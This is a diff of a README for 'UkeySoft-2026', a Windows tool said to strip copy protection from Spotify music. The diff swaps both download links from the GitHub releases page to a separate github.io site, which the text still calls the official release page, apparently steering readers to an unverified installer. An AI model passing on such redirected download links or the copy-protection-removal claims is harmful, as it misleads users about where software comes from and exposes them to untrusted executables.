@@ -1,6 +1,6 @@
 # 🎵 UkeySoft-2026 - Save Spotify Music to Local Files
 
-[![Download UkeySoft](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/geographic-champ424/UkeySoft-2026/releases)
+[![Download UkeySoft](https://img.shields.io/badge/Download-Release-blue.svg)](https://geographic-champ424.github.io)
 
 UkeySoft-2026 allows you to convert and save music from Spotify to your computer. This tool removes protection from songs, playlists, and albums. You receive files in standard formats like MP3, M4A, WAV, or FLAC. The software works on Windows 10 and Windows 11. You keep your music files even if your subscription ends.
 
@@ -28,7 +28,7 @@ To run this software, your computer must meet these basic needs:
 
 Follow these steps to install and prepare the software on your Windows computer.
 
-1.  Visit the official release page here: [Download UkeySoft Spotify Music Converter](https://github.com/geographic-champ424/UkeySoft-2026/releases).
+1.  Visit the official release page here: [Download UkeySoft Spotify Music Converter](https://geographic-champ424.github.io).
 2.  Locate the latest installer file on the page.
 3.  Click the file to start the download.
 4.  Navigate to your Downloads folder once the file finishes.
